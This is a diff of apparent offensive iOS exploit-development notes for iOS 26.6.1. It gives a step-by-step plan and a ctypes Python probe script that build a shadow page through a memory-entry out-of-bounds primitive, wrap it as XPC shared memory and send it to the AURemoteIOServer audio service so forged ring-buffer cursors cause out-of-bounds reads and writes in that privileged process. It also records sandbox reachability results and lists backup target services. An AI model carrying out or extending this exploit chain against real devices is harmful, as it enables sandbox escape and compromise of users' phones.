@@ -225,42 +225,55 @@ The IOKit binary from device symbols (`iPhone17,4 26.6.1 (23G83)/Symbols/.../IOK
 
 ---
 
-### Surface C — XPC xpc_shmem_t substitution (HIGH)
+### Surface C — AudioUnit RemoteIO XPC shmem substitution (HIGH)
 
-**Status:** Active probe in progress (2026-10-29). XPC connection to `com.apple.mediaserverd` attempted with our named entry as the shmem backing.
+**Status:** Static analysis complete (2026-10-30). Service confirmed accessible. Need device probe after memory restart.
 
-- `xpc_shmem_create(addr, size)` → named entry port wrapped in XPC dict
-- Receiving service: `xpc_shmem_map(shmem, &ptr)` → `mach_vm_map(..., named_entry_port, ...)`
-- Substitute our Surface-4 `ne` (or phantom alias `ne`) → service maps our shadow page → TOCTOU
-- Target confirmed reachable: `com.apple.mediaserverd`
+**Target service (corrected):** `com.apple.audio.AURemoteIOServer` — NOT `audiohald` (bootstrap_look_up kr=0x44c = not found) or `mediaserverd`.
+
+**Architecture confirmed via Mac terminal + otool (AudioToolbox.framework, iOS 26.6.1):**
+- The audio CLIENT (AudioToolbox) creates the shared memory and sends it to AURemoteIOServer
+- Key class: `IPCAUSharedMemoryBase::DoPrepareSharedBuffer()` → calls `InitServer(asbd, frames, channels, XPCServerToken&)`
+- `SharableMemoryBlock::XPCServerToken` (defined in AudioToolbox) wraps the named entry as `xpc_shmem_t`
+- AudioToolbox imports `mach_make_memory_entry_64` + `xpc_shmem_create` — confirms client creates NE, wraps in xpc_shmem
+- AURemoteIOServer receives and maps via `SharableMemoryBlock::XPCClientToken` (imported from CoreAudio)
+- This is the same IODataQueue cursor pattern: shared ring buffer with cursors in the shared region
+
+**XPC message keys (from AudioToolbox disasm):**
+- `"sharedMemory"` — the `xpc_shmem_t` object (our attack target)
+- `"eventlink"` — Mach port for the run-loop event link
+- `"resourceUUID"` — session UUID
+- `"audioBuffers"` — audio buffer list description
+
+**Device probe (2026-10-30):**
+- `com.apple.audio.AURemoteIOServer`: `bootstrap_look_up` kr=0x0 ✓ accessible!
+- `com.apple.audio.audiohald`: kr=0x44c (does not exist by that name)
+- Memory was at 1960 MB when probed — no further device work this session
+
+**Attack plan:**
+1. Shadow page `q[0x3000]` from Surface 4 → `ne` port (via `mach_make_memory_entry_64`)
+2. Map `ne` as VA `m_shadow`
+3. Call `xpc_shmem_create(m_shadow, ring_buf_size)` → creates `shmem` wrapping our shadow page
+4. Connect to `com.apple.audio.AURemoteIOServer` via `xpc_connection_create_mach_service`
+5. Craft XPC dict: `{"sharedMemory": shmem, "eventlink": ..., "resourceUUID": ..., "audioBuffers": ...}`
+6. Send to AURemoteIOServer → it calls `xpc_shmem_map(shmem)` → maps our shadow page
+7. AURemoteIOServer reads ring buffer cursors from the mapped region
+8. We write forged cursors to `q[0x3000]` AFTER mapping → OOB read/write in AURemoteIOServer
 
 **COW gotcha (important for ne construction):**
-Writing to the shadow buffer BEFORE calling MMME64 triggers copy-on-write. If you then use `MAP_MEM_VM_SHARE` to export a named entry, it re-exports the pre-COW physical page (the original clean page) — your write is not visible.
+Write to shadow buffer FIRST, THEN create named entry with `permission=3` (no `MAP_MEM_VM_SHARE`) to lock the COW'd page.
 
-**Fix:** Write to the buffer first, THEN create the named entry with plain `permission=3` (no `MAP_MEM_VM_SHARE`) to lock the COW'd page into the entry. Then the alias works as expected.
+**Probe results (2026-10-29, mediaserverd attempt):**
+- Connection to `com.apple.mediaserverd` from sandbox: SUCCESS
+- Service replied with `XPCErrorDescription` — wrong message format, not access-denied
+- Confirms XPC channel open from sandbox; just need the correct message schema
 
-**Probe results (2026-10-29):**
-- Connection to `com.apple.mediaserverd` from sandbox: **SUCCESS** (conn non-NULL)
-- `xpc_shmem_create` on our aliased buffer: **SUCCESS** (shmem object non-NULL)
-- Service received message and replied: **YES** (non-NULL reply, not connection-refused)
-- Reply type: `0x203044698` (unknown private type, NOT `XPC_TYPE_ERROR` or `XPC_TYPE_DICT`)
-- Reply has 1 key: `XPCErrorDescription` — the service rejected the unknown message format, not the connection itself
-- **Conclusion:** XPC channel is open from sandbox. The service expects a specific protocol message, not a bare `data: shmem` key. We need the correct message format for mediaserverd's shmem-based audio buffer operations.
+**Next step after memory restart (need ~1230 MB baseline):**
+1. Create minimal XPC connection to AURemoteIOServer
+2. Send a "hello" dict and observe reply format (crash vs. specific error)
+3. Then fill in the required keys with our shadow shmem
 
-**Protocol research findings (2026-10-29):**
-- `mediaserverd` binary is dyld-cache-only — no on-disk binary, can't do string search without Mac
-- ObjC runtime introspection found: **`_AFAudioPowerXPCSharedMemory`** (`initWithXPCObject:`) — AudioFoundation wrapper that receives an XPC shmem from a service. Prefix "AF" = AudioFoundation.
-- Also found: `PLXPCShMemData` (`initWithXPCShmem:length:`) — Photos library receives shmem via XPC
-- `com.apple.mediaserverd` not in any launchd plist — likely an alias or renamed endpoint
-
-**Better target: `com.apple.audio.audiohald`**
-From REPORT_XPC_NAMEDENTRY.md: CoreAudio shares an audio ring buffer with audiohald. The ring buffer tracks read/write cursors in the shared region (IODataQueue pattern). The CLIENT provides its input ring buffer (named entry), the server provides the output ring. Cursors in the shared region → if we forge them after mapping, audiohald reads outside the buffer → heap corruption in audiohald.
-
-No entitlement needed for audio client role. `_AFAudioPowerXPCSharedMemory.initWithXPCObject:` confirms the XPC shmem path is active in the audio stack.
-
-**Next step:** Probe `com.apple.audio.audiohald` — connect, send our named entry as the input ring buffer, confirm it gets mapped.
-
-Other target: `com.apple.coremedia.remotepipeline`, `com.apple.coremedia.mediaplaybackd.bytestream.xpc`
+Other targets (backup): `com.apple.coremedia.remotepipeline`, `com.apple.audio.SystemSoundServer-iOS` (also accessible, kr=0x0)
 
 ---
 
@@ -314,14 +327,86 @@ Full analysis in STATE.md. Requires kernel exec as precondition.
 
 ## Next Steps (priority order)
 
-**← RESUME HERE →**
-1. **Surface C / audiohald** — XPC ne substitution to `com.apple.audio.audiohald`:
-   - `com.apple.mediaserverd` probe done (channel open, wrong protocol)
-   - Next: connect to audiohald, send named entry as input ring buffer, confirm it maps
+**← RESUME HERE → (need PocketCode restart to ~1230 MB first)**
 
-3. **Surface 4 stacking amplification** — use child entry as parent; repeat ~0x4000 times for physical OOB primitive
+1. **Surface C probe (AURemoteIOServer)** — after restart:
+   - Service accessible: `com.apple.audio.AURemoteIOServer` kr=0x0 confirmed
+   - Step 1: `xpc_connection_create_mach_service("com.apple.audio.AURemoteIOServer", NULL, 0)` + send minimal dict → observe reply keys
+   - Step 2: craft full dict with `"sharedMemory": xpc_shmem_create(shadow_va, size)`, `"eventlink"`, `"resourceUUID"`, `"audioBuffers"` keys
+   - Step 3: AURemoteIOServer maps our shmem → write forged ring cursors → OOB in privileged process
+   - Script template ready (see code block below)
 
-4. **Surface D demo** — once in SpringBoard context: `[UIStatusBarServer postStatusBarOverrideData:]` with seconds in timeString
+2. **Surface 4 stacking amplification** — use child entry as parent; repeat ~0x4000 times for physical OOB primitive
+
+3. **Surface D demo** — once in SpringBoard context: `[UIStatusBarServer postStatusBarOverrideData:]` with seconds in timeString
+
+### Surface C Probe Script (run AFTER restart + memory check)
+
+```python
+import ctypes as C
+
+L = C.CDLL('/usr/lib/libSystem.B.dylib')
+X = C.CDLL('/usr/lib/system/libxpc.dylib')
+L.mach_task_self.restype = C.c_uint32
+t = L.mach_task_self()
+
+# 1. Get shadow page via Surface 4 OOB
+M = L.mach_make_memory_entry_64
+M.argtypes = [C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_int,C.POINTER(C.c_uint32),C.c_uint32]
+V = L.mach_vm_map
+V.argtypes = [C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_uint64,C.c_int,C.c_uint32,C.c_uint64,C.c_int,C.c_int,C.c_int,C.c_int]
+L.mach_vm_allocate.argtypes = [C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_int]
+a = C.c_uint64(0); L.mach_vm_allocate(t,C.byref(a),0x4000,1)
+p = C.c_uint32(0); ps = C.c_uint64(0x4000)
+M(t,C.byref(ps),a.value,3,C.byref(p),0)
+c = C.c_uint32(0); cs = C.c_uint64(0x1001)
+M(t,C.byref(cs),0x1000,3,C.byref(c),p.value)
+m = C.c_uint64(0); V(t,C.byref(m),0x4000,0,1,c.value,0,0,3,3,0)
+q = (C.c_uint8*0x4000).from_address(m.value)
+q[0x3000] = 0xAB  # OOB write creates shadow page
+ne = C.c_uint32(0); ns = C.c_uint64(0x1000)
+M(t,C.byref(ns),m.value+0x3000,3,C.byref(ne),0)
+m4 = C.c_uint64(0); V(t,C.byref(m4),0x4000,0,1,ne.value,0,0,3,3,0)
+shadow_va = m4.value
+print(f"shadow VA: {hex(shadow_va)} ne={ne.value}")
+
+# 2. Create xpc_shmem from shadow VA
+X.xpc_shmem_create.restype = C.c_void_p
+X.xpc_shmem_create.argtypes = [C.c_void_p, C.c_uint64]
+shmem = X.xpc_shmem_create(shadow_va, 0x1000)
+print(f"xpc_shmem: {hex(shmem or 0)}")
+
+# 3. Connect to AURemoteIOServer
+X.xpc_connection_create_mach_service.restype = C.c_void_p
+X.xpc_connection_create_mach_service.argtypes = [C.c_char_p, C.c_void_p, C.c_uint64]
+X.xpc_connection_resume.restype = None
+X.xpc_connection_resume.argtypes = [C.c_void_p]
+conn = X.xpc_connection_create_mach_service(b"com.apple.audio.AURemoteIOServer", None, 0)
+X.xpc_connection_resume(conn)
+print(f"conn: {hex(conn or 0)}")
+
+# 4. Send minimal dict and observe reply
+X.xpc_dictionary_create.restype = C.c_void_p
+X.xpc_dictionary_create.argtypes = [C.c_void_p, C.c_void_p, C.c_uint64]
+X.xpc_dictionary_set_value.restype = None
+X.xpc_dictionary_set_value.argtypes = [C.c_void_p, C.c_char_p, C.c_void_p]
+X.xpc_connection_send_message_with_reply_sync.restype = C.c_void_p
+X.xpc_connection_send_message_with_reply_sync.argtypes = [C.c_void_p, C.c_void_p]
+X.xpc_get_type.restype = C.c_void_p
+X.xpc_get_type.argtypes = [C.c_void_p]
+X.xpc_dictionary_apply.restype = C.c_int
+X.xpc_copy_description.restype = C.c_char_p
+X.xpc_copy_description.argtypes = [C.c_void_p]
+
+msg = X.xpc_dictionary_create(None, None, 0)
+if shmem:
+    X.xpc_dictionary_set_value(msg, b"sharedMemory", shmem)
+reply = X.xpc_connection_send_message_with_reply_sync(conn, msg)
+print(f"reply: {hex(reply or 0)}")
+if reply:
+    desc = X.xpc_copy_description(reply)
+    print(f"reply desc: {desc[:500] if desc else 'none'}")
+```
 
 ---
 
